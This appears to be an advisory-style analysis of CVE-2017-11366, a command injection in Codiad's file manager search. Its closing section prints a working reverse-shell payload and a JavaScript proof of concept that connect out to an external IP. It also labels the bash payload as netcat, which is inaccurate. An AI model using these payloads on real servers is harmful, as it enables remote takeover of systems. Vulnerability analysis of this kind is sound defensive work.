Based on the provided content, here's the breakdown of the vulnerability:

**CVE ID:** CVE-2017-11366

**Root Cause of Vulnerability:**

- The vulnerability lies in the `search` function of the `filemanager/controller.php` file.
- The `search_file_type` parameter, which is directly taken from the POST request, is passed to the `shell_exec` function without any sanitization.
- The `shell_exec` function executes a system command, and the attacker can inject arbitrary shell commands through the `search_file_type` parameter.

**Weaknesses/Vulnerabilities Present:**

- **Remote Command Execution (RCE):** The most significant weakness is the ability to execute arbitrary shell commands on the server.
- **Lack of Input Sanitization:** The application fails to sanitize the `search_file_type` parameter before passing it to the `shell_exec` function.
- **Direct use of `shell_exec` with user-controlled input:** The direct use of `shell_exec` with user-controlled input is a dangerous practice and a major vulnerability.

**Impact of Exploitation:**

- **Full Server Compromise:** An attacker can gain complete control of the server.
- **Data Breach:** Attackers can access sensitive files, modify or delete data.
- **Malware Installation:** Attackers can install malware, backdoors, or other malicious software.
- **Denial of Service (DoS):** Attackers can potentially cause a denial of service by crashing the server or overloading resources.
- **Lateral Movement:** If the server is connected to a network, the attacker can use the compromised machine as a pivot to gain access to other machines.

**Attack Vectors:**

- **HTTP POST Request:** The attack vector is an HTTP POST request to `/components/filemanager/controller.php?action=search`.
- **`search_file_type` parameter:**  The attacker injects malicious shell commands within the `search_file_type` POST parameter.

**Required Attacker Capabilities/Position:**

- **Network Access:** The attacker must have network access to the server running the Codiad application.
- **Knowledge of the vulnerability:** The attacker needs to know about the vulnerable `search` function and how the `search_file_type` parameter is handled.

**Technical Details:**

- The vulnerable code snippet is within `components/filemanager/controller.php`:

```php
$output = shell_exec('find -L ' . $this->path . ' -iregex  ".*' . $this->search_file_type  . '" -type f | xargs grep -i -I -n -R -H "' . $input . '"');
```
- The attacker can inject commands into `$this->search_file_type`.
- The exploit demonstrated uses a newline character (`%0a`) to break the find command and insert a new command like a reverse shell.
- Example of exploit payload using netcat
```
search_file_type = "SniperOJ"%0a%2Fbin%2Fbash+-c+%27sh+-i+>%26+%2Fdev%2Ftcp%2F8.8.8.8%2F8888+0>%261%27%0agrep%20"SniperOJ"
```
- Example of POC
```
ip="8.8.8.8";
port="8888";
$.get("/components/project/controller.php?action=get_current",function(d){p=JSON.parse(d)['data']['path'];$.post("/components/filemanager/controller.php?action=search&path="+p,{"search_file_type":"\"\n/bin/bash -c 'sh -i >&/dev/tcp/"+ip+"/"+port+" 0>&1'\ngrep \"",});});
```
